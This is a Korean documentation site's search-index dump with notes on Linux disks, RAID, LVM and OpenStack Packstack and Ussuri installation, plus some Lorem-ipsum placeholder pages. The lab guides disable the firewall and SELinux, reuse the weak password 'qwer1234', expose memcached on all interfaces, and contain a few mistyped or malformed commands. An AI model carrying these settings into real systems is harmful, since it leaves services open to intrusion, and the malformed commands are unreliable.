부가기능 추가 별도으 컨트롤러 필요, 일반적으로 스카시로 읽음, 병렬 SAS : Serial Attached SCSI, scsi 타입의 직렬 연결 버전, 마찬가지로 별도의 컨트롤러 필요, SATA와 SCSI의 장점으로 만들어짐.     Linux HD 추가 $ df -h\r# 용량 확인\r$ fdisk -l\r# 디스크 확인\r VMware에 하드 5G HD2개 추가   $ echo \u0026#34;- - -\u0026#34; \u0026gt; /sys/class/scsi_host/host[ n ]/scan\r# 디스크 인식\r 그림과 같이 5G 섹터가 2개 추가됩니다.   $ fdisk [ /dev/sd* ] # 디스크 이름\rCommand (m for help): n\r# 새로운 파티션 생성\rCommand (m for help): p or e\r# p = 주 파티션, e = 확장 파티션\rCommand (m for help): number\r# 파티션 번호\rCommand (m for help): start sector # 시작 섹터 번호\rCommand (m for help): partition size\r# 파티션의 크기\rCommand (m for help): p\r# 확인\rCommand (m for help): w\r# 저장\rCommand (m for help): q\r# 저장하지 않고 종료\r 파티션을 생성합니다.   $ mkfs /dev/sd* # 생성 파티션 이름\r# 디스크 포맷\r$ mkfs -t ext4 /dev/sd* # 생성 파티션 이름\r# 디스크의 타입을 ext4로 포맷\r 디스크를 포맷합니다.   $ mkdir disk1\r$ mount /dev/sd* disk1\r$ mkdir disk2\r$ mount /dev/sd* disk2\r$ mount\r$ df -h\r# 확인\r 디스크를 마운트 합니다.   $ umount /dev/sd*\r# 디스크의 마운트를 해제 합니다.\r      $ vi /etc/fstab\r[ 장치명 ] [ 마운트 포인트 ] FStype [ 옵션 ] dump fsck\r 자동 마운트 등록     RAID ( Redundant Array of Inexpensive Disks )  여러 디스크를 논리적으로 묶어 하나의 논리 디스크를 생성하는 것    RAID 종류  0 : 하나의 디스크에 데이터를 기록하면서 동시에 다른 디스크에는 나머지 데이터를 기록하는 방법, 읽기/ 쓰기 속도는 n배, 안정성은 1/n배, FT = 0 1 : 하나의 디스크에 기록되는 모든 데이터가 다른 디스크에 고스란히 복사되는 방법, 읽기, 쓰기 속도는 1배, 안전성은 n배, FT = n-1 2, 3, 4 : 최소 3개의 디스크가 필요하며 2개의 디스크는 raid 0 처럼 구성하고 하나의 디스크는 데이터를 복구하기 위한 패리티 값을 저장, 읽기 쓰기 속도는 n-1배, 안정성 n-2배, FT = 1, 레벨 2, 3, 4마다 각각 데이터 저장 박식이 조금씩 차이가 있다. 5 : 최소 3개의 디스크가 필요하며 2개의 디스크는 raid 0처럼 구성하고 하나의 디스크는 데이터를 복구하기 위한 패리티 값을 저장, 읽기/ 쓰기 속도는 n-1배, 안전성은 n-2배, FT = 1, 레벨 2, 3, 4와는 달리 패리티 값을 여러 디스크에 분산해서 저장 1 + 0 : 2개의 디스크를 먼저 raid 1로 묶고, 묶인 논리 디스크를 다시 raid 0으로 묶는 방법 0 + 1 : 2개의 디스크를 먼저 raid 0로 묶고, 묶인 논리 디스크를 다시 raid 1으로 묶는 방법   madam [ 옵션 ]\r--create : 생성할 RAID 장치의 이름\r--level : RAID 레벨을 지정\r--raid--devices : RAID 추가될 실제 장치의 파티션 지정\r--detail : 특정 장치의 상세 내역을 출력\r# RAID 생성\r$ mdadm --manage [ RAID 장치명 ] --add [ 추가할 디스크 파티션 명 ]\r# 이미 구성되어진 RAID에 디스크 새로 추가\r$ madam --stop [ RAID 장치명 ]\r$ madam --zerosuperblock [ 파티션 장치명 ]\r# RAID 구성 삭제\r RAID 명령어 RAID 생성 후, 다시 포맷, 마운트 작업을 진행해야 됨   $ mdadm --create /dev/md/linear --level linear --raid-devices=2 /dev/sd* /dev/sd*\r# Linear : 디스크를 배열 형태로 단순하게 연결시킨 구조\r$ mdadm --create /dev/md/stripe --level stripe --raid-devices=2 /dev/sd* /dev/sd*\r# Stripte : 데이터의 내용을 분산 저장하여 속도가 빠르다, 안전성은 낮음\r RAID 0 구성   $ mdadm --create /dev/md/mirror --level mirror --raid-devices=2 /dev/sd* /dev/sd*\r# RAID 1 구성\r RAID 1 구성   $ mdadm --create /dev/md/raid5 --level=5 --raid-devices=3 /dev/sdh1 /dev/sdi1 /dev/sdj1\r# RAID 5 구성\r RAID 5 구성     LVM  위와 같이 파티션만 생성 후 ( 단 생성시 타입을 LVM으로 변경 ( t -\u0026gt; 8e ) )    PV 생성 및 확인  $ pvcreate [ 파티션명 ]\r# PV 생성\r$ pvscan\r# PV 확인\r$ pvdisplay [ 파티션명 ]\r# PV 확인\r  VG 생성 및 확인  $ vgcreate [ 볼륨그룹명 ] [ 파티션명1 ] [ 파티션명2 ] [ 파티션명3 ] ....\r# VG 생성\r$ vgscan\r# VG 확인\r$ vgdisplay [ 볼륨그룹명 ]\r# VG 확인\r  LV 생성 및 확인  $ lvcreate -L [ 볼륨크기 ] -n [ 볼륨명 ] [ 볼륨그룹명 ]\r# LV 생성\r$ lvscan\r# LV 확인\r$ lvdisplay [ 볼륨명 ]\r# LV 확인\r  파일 시스템 적용 후 및 마운트  $ mkfs -t [ 파일 시스템의 타입 ] [ 볼륨 명 ]\r# 포맷\r$ mount [ 볼류 명 ] [ 마운트 포인트 ]\r# 마운트\r 상시 적용 또한 /etc/fstab에 수정을 통해 등록이 가능합니다.   "});index.add({'id':92,'href':'/docs/cloudcomputing/dockertraining/','title':"Docker Training",'content':"Docker\n"});index.add({'id':93,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/','title':"정리전",'content':"Collapsed Level of Menu Cognita laeva illo fracta Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.\n Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit  "});index.add({'id':94,'href':'/docs/programing/golang/','title':"Golang",'content':"Go lang 제목 "});index.add({'id':95,'href':'/docs/programing/web/','title':"Web",'content':"Collapsed Level of Menu Cognita laeva illo fracta Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.\n Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit  "});index.add({'id':96,'href':'/docs/programing/web/django/','title':"Django",'content':"구성 admin page boardapp page admin page 모든 내용을 관리할 수 있다. boardapp page 각 카테고리 별 게시판을 조회할 수 있다. board, reply, like 을 수정 조회 할 수 있다. admin, board 이외에 다른 페이지도 추가할 수 있다.\n"});index.add({'id':97,'href':'/docs/project/mini/','title':"M Ini",'content':"Collapsed Level of Menu Cognita laeva illo fracta Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.\n Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit  "});index.add({'id':98,'href':'/docs/programing/git/','title':"Git",'content':"Collapsed Level of Menu Cognita laeva illo fracta Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.\n Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit  "});index.add({'id':99,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-01/','title':"OpenStack Ussuri : Overview",'content':"OpenStack Ussuri : Overview  OpenStack Ussuri : Overview    OpenStack Ussuri 설치는 위의 그림과 표에 맞춰 설치가 진행됩니다. minimal 기본 설치는 keystone, glance, nova, neutron, cinder, horizon이며 여기서는 가능한 모든 서비스를 설치하도록 하겠습니다.      OS HOST NAME CPU/thead RAM DISK Network Interface-1 Network Interface-2      CentOS8 controller 4/8 6144 100G Nat host1    CentOS8 network 2/4 2048 40G Nat host1    CentOS8 compute 4/8 6144 40G   host1    CentOS8 storage1 1/2 6144 50G   host1    CentOS8 storage2 1/2 6144 50G   host1    CentOS8 storage3 1/2 6144 50G   host1         Service Code Name Description     Identity Service Keystone User Management   Compute Service Nova Virtual Machine Management   Image Service Glance Manages Virtual image like kernel image or disk image   Dashboard Horizon Provides GUI console via Web browser   Object Storage Swift Provides Cloud Storage   Block Storage Cinder Storage Management for Virtual Machine   Network Service Neutron Virtual Networking Management   Orchestration Service Heat Provides Orchestration function for Virtual Machine   Metering Service Ceilometer Provides the function of Usage measurement for accounting   Database Service Trove Database resource Management   Data Processing Service Sahara Provides Data Processing function   Bare Metal Provisioning Ironic Provides Bare Metal Provisioning function   Messaging Service Zaqar Provides Messaging Service function   Shared File System Manila Provides File Sharing Service   DNS Service Designate Provides DNS Server Service   Key Manager Service Barbican Provides Key Management Service      "});index.add({'id':100,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-11/','title':"OpenStack Ussuri Overview",'content':"OpenStack Ussuri  OpenStack Ussuri  "});index.add({'id':101,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-12/','title':"OpenStack Ussuri Overview",'content':"OpenStack Ussuri  OpenStack Ussuri  "});index.add({'id':102,'href':'/docs/cloudcomputing/openstacktraining/packstack/','title':"Packstack",'content':"Packstack Stein 설치  Packstack   Redhat 계열 ( ex : CentOS )의 OpenStack 자동화 설치 툴     Packstack stain 설치   기본적으로 PackStack은 올인원 or 다중노드로 구성할 수 있으며, 여기서는 올인원으로 설치를 진행하며, 다중노드에 대한 설정은 추가하도록 하겠습니다.   설치사양     OS CPU RAM DISK     CenOS7 4/ 2 10240 100G      만약 다중 노드에 경우 소스를 분산시키고 각 노드에 설정을 추가합니다.  hosts, hostname 등록 및 설정 다중 노드의 경우 controller node에서 다른 노드의 ssh 접속을 위한 키를 등록시킵니다.    $ controller\u0026gt; $ ssh-keygen\r$ controller\u0026gt; $ ssh-copy-id network\r$ controller\u0026gt; $ ssh-copy-id compute\r$ controller\u0026gt; $ ssh-copy-id ... 다른 노드\r   설치 순서   firewalld 설정 setenforce을 진행합니다.  $ systemctl stop firewalld\r$ systemctl disable firewalld\r$ systemctl stop NetworkManagaer\r$ systemctl disable NetworkManagaer\r# 방화벽 및 네트워크 매니저 설정을 진행합니다.\r$ setenforce 0\r$ sed -i \u0026#39;s/=enforcing/=disabled/g\u0026#39; /etc/sysconfig/selinux\r# setenforce 설정을 진행합니다.\r    OpenStack stain release를 등록합니다.  $ yum -y update\r# 기본 패키지를 업데이트 합니다.\r$ yum install -y centos-release-openstack-stein\r$ yum -y update\r# stein 레포지터리를 등록 후, 다시 업데이트를 진행합니다.\r    올인원의 경우  $ yum install -y openstack-packstack\r$ packstack --allinone\r# packstack을 통해 OpenStack 설치를 진행합니다.\r    다중노드의 경우  $ packstack --gen-answer-file=/root/stein-answer.txt\r# Packstack 설정 파일을 설치합니다.\r$ vi /root/stein.answer.txt\rCONFIG_CONTROLLER_HOST=contoller\rCONFIG_COMPUTE_HOSTS=compute1,compute2,compute3....\rCONFIG_NETWORK_HOSTS=network1,network2....\rCONFIG_PROVISION_DEMO=n\rCONFIG_NTP_SERVERS=0.centos.pool.ntp.org iburst, 1.centos.pool.ntp.org iburst, 2.centos.pool.ntp.org iburst, 3.centos.pool.ntp.org iburst\rCONFIG_CINDER_VOLUMES_SIZE=100G\r# 기본적인 설정을 진행합니다.\r# 설치 시 각 OpenStack의 서비스들을 원하는 Node의 설치할 수 있습니다.\r$ packstack --answer-file=/root/stein-answer.txt\r# packstack 설치를 진행합니다.\r    접속 IP, PW 확인  $ /var/tmp/packstack/....../openstack-setup.log | cat USERNAME=\r$ /var/tmp/packstack/....../openstack-setup.log | cat ADMIN_PW=\r# 사용자 이름 및 암호 출력\r  "});index.add({'id':103,'href':'/docs/cloudcomputing/openstack/sahara/','title':"Sahara",'content':"Sahara   데이터 프로세싱 서비스 Sahara  오픈스택 위 빅데이터를 다루기 위한 Hadoop이나 Spark를 쉽게 제공할 수 있게 도와주는 서비스 Sahara는 다음 요소로 구성  Auth: 클라이언트 인증 및 권한을 부여, 오픈스택 인증 서비스 Keystone과 통신 DAL: Data Access Layer의 약어로 데이터 엑세스 계층을 의미, DB의 내부 모델을 유지 Secure Storage Access Layer: 암호 및 개인 키 같은 인증 데이터를 안전한 저장소에 보관 Provisioning Engine: 오픈스택 컴퓨트 서비스 Nova, Heat, Cinder, Glance, Designate와 통신을 담당하는 구성 요소 Vendor Plugins: 프로비저닝된 VM에서 데이터 처리 프레임워크를 구성하고 시작하는 기능을 담당하는 플러그 가능한 메커니즘 EDP: Elastic Data Processing의 약어로 Sahara가 제공하는 클러스테에서 데이터 처리 작업을 예약하고 관리 REST API: REST HTTP 인터페이스로 Sahara 기능을 호출 Python Sahara Client: 다른 오픈스택 구성 요소와 마찬가지로 Sahara에는 자체 Python 클라이언트가 있음 Sahara Pages: Sahara용 GUI로 오픈스택 대시보드인 Horizon에 있음    "});index.add({'id':104,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-02/','title':"OpenStack Ussuri : 기본 환경설정",'content':"OpenStack Ussuri : 기본 환경설정   ----------------------- | [ Controller Node ] | | | | MariaDB RabbitMQ | | Memcached | -----------------------  OpenStack Ussuri : 기본 환경설정  Controller MariaDB 설차  $ controller\u0026gt; dnf module -y install mariadb:10.3\r$ controller\u0026gt; vi /etc/my.cnf.d/charaset.cnf\r[mysqld]\rcharacter-set-server = utf8mb4\r[client]\rdefault-character-set = utf8mb4\r# mariadb를 설치 후, charaset 설정을 변경하기 위해 파일을 수정합니다.\r$ controller\u0026gt; systemctl restart --now mariadb\r$ controller\u0026gt; systemctl enable --now mariadb\r# DB를 재시작 합니다.\r$ controller\u0026gt; firewall-cmd --add-service=mysql --permanent\r$ controller\u0026gt; firewall-cmd --reload\r# 방화벽을 설정합니다.\r$ controller\u0026gt; mysql_secure_installation\r$ controller\u0026gt; mysql -u root -p\r# 설정을 초기화 후, 비빌번호를 생성합니다.\r   NTP ( Network Time Protocol ) Server 설치   NTP Server는 모든 Node에서 설정을 진행합니다.  $ all\u0026gt; dnf --enablerepo=centos-openstack-ussuri -y install openstack-selinux\r# selinu를 설치합니다.\r$ all\u0026gt; dnf install -y wget\r# wget을 설치합니다.\r$ all\u0026gt; dnf install -y epel-release\r# epel 레포지터리를 설치합니다.\r$ all\u0026gt; dnf -y install checkpolicy\r# CentOS8에서 사라진 Checkpolicy 패키지를 다운 받습니다.\r$ all\u0026gt; dnf -y install chrony\r$ all\u0026gt; vi /etc/chrony.conf\r# pool 2.centos.pool.ntp.org iburst\rpool ntp.nict.jp iburst\rallow 10.10.10.0/24\r$ all\u0026gt; systemctl enable --now chronyd\r# chrony 파일을 수정합닏. allow에는 사용대역을 기입합니다.\r$ all\u0026gt; firewall-cmd --add-service=ntp --permanent\r$ all\u0026gt; firewall-cmd --reload\r$ all\u0026gt; init 6\r$ all\u0026gt; chronyc sources\r^+ ntp-k1.nict.jp 1 6 17 10 -588us[-2093us] +/- 28ms\r^+ ntp-a3.nict.go.jp 1 6 17 10 -2468us[-3973us] +/- 30ms\r^* ntp-b3.nict.go.jp 1 6 17 10 +1015us[ -490us] +/- 22ms\r^- ntp-b2.nict.go.jp 1 6 17 10 +2720us[+2720us] +/- 22ms\r# 방화벽을 등록 후 확인합니다.\r   Ussuri repository 등록   OpenStack 구현을 위해 Ussuri repository를 구현합니다.  $ all\u0026gt; dnf -y install centos-release-openstack-ussuri\r$ all\u0026gt; sed -i -e \u0026#34;s/enabled=1/enabled=0/g\u0026#34; /etc/yum.repos.d/CentOS-OpenStack-ussuri.repo\r$ all\u0026gt; dnf --enablerepo=centos-openstack-ussuri -y upgrade\r   RabbitMQ, Memcached 설치   RabbitMQ는 오픈 소스 메시지 브로커 소프트웨어이며, AMQP를 구현합니다. RabbitMQ는 OpenStack에서는 서로간의 통신을 위해 사용됩니다. Memcached이란 Memcached 는 범용 분산 캐시 시스템로, OpenStack에서 캐시값을 관리합니다. RabbitMq, Memcached는 Controller에서만 설치를 진행합니다.  $ controller\u0026gt; dnf --enablerepo=PowerTools -y install rabbitmq-server memcached\r$ controller\u0026gt; vi /etc/my.cnf.d/mariadb-server.cnf\r[mysqld]\r.....\r.....\rmax_connections=500\r# 인증허용 시간 값을 추가합니다.\r$ controller\u0026gt; vi /etc/sysconfig/memcached\rOPTIONS=\u0026#34;-l 0.0.0.0,::\u0026#34;\r# 모두가 사용할 수 있도록 값을 수정합니다.\r$ controller\u0026gt; systemctl restart mariadb rabbitmq-server memcached\r$ controller\u0026gt; systemctl enable mariadb rabbitmq-server memcached\r# RabbitMQ, Memcached 서비스를 등록합니다.\r$ controller\u0026gt; rabbitmqctl add_user openstack qwer1234\r$ controller\u0026gt; rabbitmqctl set_permissions openstack \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34;\r# rabbitmq를 사용할 openstack 유저를 패스워드 qwer1234로 생성하고 모든 권한을 줍니다.\r$ controller\u0026gt; vi rabbitmqctl.te\rmodule rabbitmqctl 1.0;\rrequire {\rtype rabbitmq_t;\rtype rabbitmq_var_log_t;\rtype rabbitmq_var_lib_t;\rtype etc_t;\rtype init_t;\rclass file write;\rclass file getattr;\r}\r#============= rabbitmq_t ==============\rallow rabbitmq_t etc_t:file write;\r#============= init_t ==================\rallow init_t rabbitmq_var_lib_t:file getattr;\rallow init_t rabbitmq_var_log_t:file getattr;\r$ controller\u0026gt; checkmodule -m -M -o rabbitmqctl.mod rabbitmqctl.te\r$ controller\u0026gt; semodule_package --outfile rabbitmqctl.pp --module rabbitmqctl.mod\r$ controller\u0026gt; semodule -i rabbitmqctl.pp\r# rabbitmq의 설정을 추가 후 등록시킵니다.\r$ controller\u0026gt; firewall-cmd --add-service=memcache --permanent\r$ controller\u0026gt; firewall-cmd --add-port=5672/tcp --permanent\r$ controller\u0026gt; firewall-cmd --reload\r# 방화벽을 설정합니다.\r"});index.add({'id':105,'href':'/docs/cloudcomputing/openstack/ironic/','title':"Ironic",'content':"Ironic   베어메탈 서비스 Ironic   물리적인 컴퓨터를 관리하고 자원을 제공하는 구성요소의 모음\n  Ironic은 구성에 따라 다음과 같은 다른 여러 오픈스택 서비스와 상호 작용할 수 있음\n  IPMI 메트릭을 사용하는 오픈스택 텔레미터 모듈(Ceilometer)\n  인증 요청 및 다른 오픈스택 서비스를 인증하는 오픈스택 인증 서비스(Keystone)\n  이미지 및 이미지 메타데이터를 검색할 수 있는 오픈스택 이미지 서비스(Glance)\n  DHCP 및 네트워크를 구성하는 오픈스택 네트워크 서비스(Neutron)\n  오픈스택 네트워크 서비스인 Nova는 베어메탈 서비스와 함꼐 작동하고, 인스턴스를 관리하는 사용자용 API를 제공\n  오픈스택 컴퓨트 서비스는 베어메탈 서비스가 제공하지 않는 예약 기능, 테넌트 할당량, IP 할당, 기타 서비스를 제공\n  오픈스택 오브젝트 스토리지 서비스인 Swift는 드라이브 설정, 사용자 이미지, 배포 로그 및 점검 데이터 임시 저장 장소를 제공\n  Ironic은 다음 요소로 구성\n  ironic-api: 응용프로그램 요청을 원격 프로시저 호출(RPC)을 이용해서 ironic-conductor로 전송한 후 응용프로그램 요청을 처리하는 RESTful API\n  ironic-conductor: 노드를 추가, 편집, 삭제하며 IPMI 또는 SSH를 사용해 노드를 켜고 끌수 있음, 베어메탈 노드를 프로비저닝, 배치 정리 수행\n  ironic-python-agent: 원격 엣세스, 하드웨어 제어, 하드웨어 기본 스펙으로 ironic-conductor 및 ironic-inspector 서비스를 제공하려고 임시 RAM 디스크에서 실행되는 python 서비스\n  "});index.add({'id':106,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-03/','title':"OpenStack Ussuri : Keystone",'content':"OpenStack Ussuri : Keystone   ----------------------- | [ Controller Node ] | | | | MariaDB RabbitMQ | | Memcached Keystone | | httpd | -----------------------  OpenStack Ussuri : Keystone   Keystone은 OpenStack에서 인증 서비스를 구성하고 있습니다. Keystone에 대한 자세한 설명은 Keystone을 참조해주세요.   Keystone 유저와 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p\r$ MariaDB\u0026gt; create database keystone; $ MariaDB\u0026gt; grant all privileges on keystone.* to keystone@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on keystone.* to keystone@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;\r   Keystone을 설치합니다.  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,epel,PowerTools -y install openstack-keystone python3-openstackclient httpd mod_ssl python3-mod_wsgi python3-oauth2client\r# keystone 및 관련 모듈을 설치합니다.\r$ controller\u0026gt; vi /etc/keystone/keystone.conf\rmemcache_servers = controller:11211\rconnection = mysql+pymysql://keystone:qwer1234@controller/keystone\r[token]\rprovider = fernet\r$ controller\u0026gt; su -s /bin/bash keystone -c \u0026#34;keystone-manage db_sync\u0026#34;\r$ controller\u0026gt; keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone\r$ controller\u0026gt; keystone-manage credential_setup --keystone-user keystone --keystone-group keystone\r# Keystone DB를 임포트 시킵니다.\r$ controller\u0026gt; keystone-manage bootstrap --bootstrap-password qwer1234 \\\r--bootstrap-admin-url http://controller:5000/v3/ \\\r--bootstrap-internal-url http://controller:5000/v3/ \\\r--bootstrap-public-url http://controller:5000/v3/ \\\r--bootstrap-region-id RegionOne\r$ controller\u0026gt; setsebool -P httpd_use_openstack on\r$ controller\u0026gt; setsebool -P httpd_can_network_connect on\r$ controller\u0026gt; setsebool -P httpd_can_network_connect_db on\r$ controller\u0026gt; vi keystone-httpd.te\rmodule keystone-httpd 1.0;\rrequire {\rtype httpd_t;\rtype keystone_log_t;\rclass file create;\rclass dir { add_name write };\r}\r#============= httpd_t ==============\rallow httpd_t keystone_log_t:dir { add_name write };\rallow httpd_t keystone_log_t:file create;\r$ controller\u0026gt; checkmodule -m -M -o keystone-httpd.mod keystone-httpd.te\r$ controller\u0026gt; semodule_package --outfile keystone-httpd.pp --module keystone-httpd.mod\r$ controller\u0026gt; semodule -i keystone-httpd.pp\r$ controller\u0026gt; firewall-cmd --add-port=5000/tcp --permanent\r$ controller\u0026gt; firewall-cmd --reload\r# 방화벽 및 SELinux를 설정합니다.\r$ controller\u0026gt; vi /etc/httpd/conf/httpd.conf\rServerName dlp.srv.world:80\r# 99번 줄에 추가합니다.\r$ controller\u0026gt; ln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/\r$ controller\u0026gt; systemctl enable --now httpd\r# httpd 서비스를 등록합니다.\r   Keystone Project 생성 $ controller\u0026gt; vi ~/admin_key\rexport OS_PROJECT_DOMAIN_NAME=default\rexport OS_USER_DOMAIN_NAME=default\rexport OS_PROJECT_NAME=admin\rexport OS_USERNAME=admin\rexport OS_PASSWORD=qwer1234\rexport OS_AUTH_URL=http://controller:5000/v3\rexport OS_IDENTITY_API_VERSION=3\rexport OS_IMAGE_API_VERSION=2\rexport PS1=\u0026#39;[\\u@\\h \\W~(keystone)]\\$ \u0026#39;\r$ controller\u0026gt; chmod 600 ~/admin_key\r$ controller\u0026gt; source ~/admin_key\r$ controller\u0026gt; echo \u0026#34;source ~/admin_key \u0026#34; \u0026gt;\u0026gt; ~/.bash_profile\r# keystone 인증파일 생성 후 시작시 등록되게 등록시킵니다. $ controller ~(keystone)\u0026gt; $ controller ~(keystone)\u0026gt; openstack project create --domain default --description \u0026#34;Service Project\u0026#34; service\r+-------------+----------------------------------+\r| Field | Value |\r+-------------+----------------------------------+\r| description | Service Project |\r| domain_id | default |\r| enabled | True |\r| id | 7c10c02365be496fb47f12bfd40fe4a7 |\r| is_domain | False |\r| name | service |\r| options | {} |\r| parent_id | default |\r| tags | [] |\r+-------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack project list\r+----------------------------------+---------+\r| ID | Name |\r+----------------------------------+---------+\r| 7c10c02365be496fb47f12bfd40fe4a7 | service |\r| c76211c24a1f460ca67274d655d46725 | admin |\r+----------------------------------+---------+\r  "});index.add({'id':107,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-04/','title':"OpenStack Ussuri : Glance",'content':"OpenStack Ussuri : Glance   ----------------------- | [ Controller Node ] | | | | MariaDB RabbitMQ | | Memcached Keystone | | httpd Glance | -----------------------  OpenStack Ussuri : Glance   Glance는 OpenStack에서 이미지 생성에 필요한 Iamge 관리 서비스를 구성하고 있습니다. Glance에 자세한 설명은 Glance를 참조해주세요.   Glance service 및 User 생성 $ contoller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 glance\r+---------------------+----------------------------------+\r| Field | Value |\r+---------------------+----------------------------------+\r| default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 |\r| domain_id | default |\r| enabled | True |\r| id | 03f5b16a7be84cb688617d1943c8fe8c |\r| name | glance |\r| options | {} |\r| password_expires_at | None |\r+---------------------+----------------------------------+\r$ contoller ~(keystone)\u0026gt; openstack role add --project service --user glance admin\r$ contoller ~(keystone)\u0026gt; openstack service create --name glance --description \u0026#34;OpenStack Image service\u0026#34; image\r+-------------+----------------------------------+\r| Field | Value |\r+-------------+----------------------------------+\r| description | OpenStack Image service |\r| enabled | True |\r| id | af365771c17a4a25ae1d0c659e2dc0eb |\r| name | glance |\r| type | image |\r+-------------+----------------------------------+\r$ contoller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne image public http://controller:9292\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | cc65faecd7b042ffafd0f262cd7547df |\r| interface | public |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | af365771c17a4a25ae1d0c659e2dc0eb |\r| service_name | glance |\r| service_type | image |\r| url | http://controller:9292 |\r+--------------+----------------------------------+\r$ contoller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne image internal http://controller:9292\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | ea41c7b17c844e658ac83c547eddcf6d |\r| interface | internal |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | af365771c17a4a25ae1d0c659e2dc0eb |\r| service_name | glance |\r| service_type | image |\r| url | http://controller:9292 |\r+--------------+----------------------------------+\r$ contoller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne image admin http://controller:9292\r+--------------+----------------------------------+\r| Field | Value |\r+--------------+----------------------------------+\r| enabled | True |\r| id | 1393a64ef0ec428ba437602ac5b390f6 |\r| interface | admin |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | af365771c17a4a25ae1d0c659e2dc0eb |\r| service_name | glance |\r| service_type | image |\r| url | http://controller:9292 |\r+--------------+----------------------------------+\r   Glance 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p\r$ MariaDB\u0026gt; create database glance; $ MariaDB\u0026gt; grant all privileges on glance.* to glance@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on glance.* to glance@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;\r   Glance 설치 $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-glance\r# Glacne 및 관련 모듈을 설치합니다.\r$ controller\u0026gt; vi /etc/glance/glance-api.conf\r[DEFAULT]\rbind_host = 0.0.0.0\r[glance_store]\rstores = file,http\rdefault_store = file\rfilesystem_store_datadir = /var/lib/glance/images/\r[database]\rconnection = mysql+pymysql://glance:qwer1234@controller/glance\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = glance\rpassword = qwer1234\r[paste_deploy]\rflavor = keystone\r# glacne 파일을 수정합니다.\r$ controller\u0026gt; su -s /bin/bash glance -c \u0026#34;glance-manage db_sync\u0026#34;\r$ controller\u0026gt; systemctl enable --now openstack-glance-api\r# Glance DB를 임포트 시킨후 서비스를 등록합니다.\r $ controller\u0026gt; setsebool -P glance_api_can_network on\r$ controller\u0026gt; vi glanceapi.te\rmodule glanceapi 1.0;\rrequire {\rtype glance_api_t;\rtype httpd_config_t;\rtype iscsid_exec_t;\rclass dir search;\rclass file { getattr open read };\r}\r#============= glance_api_t ==============\rallow glance_api_t httpd_config_t:dir search;\rallow glance_api_t iscsid_exec_t:file { getattr open read };\r$ controller\u0026gt; checkmodule -m -M -o glanceapi.mod glanceapi.te\r$ controller\u0026gt; semodule_package --outfile glanceapi.pp --module glanceapi.mod\r$ controller\u0026gt; semodule -i glanceapi.pp\r$ controller\u0026gt; firewall-cmd --add-port=9292/tcp 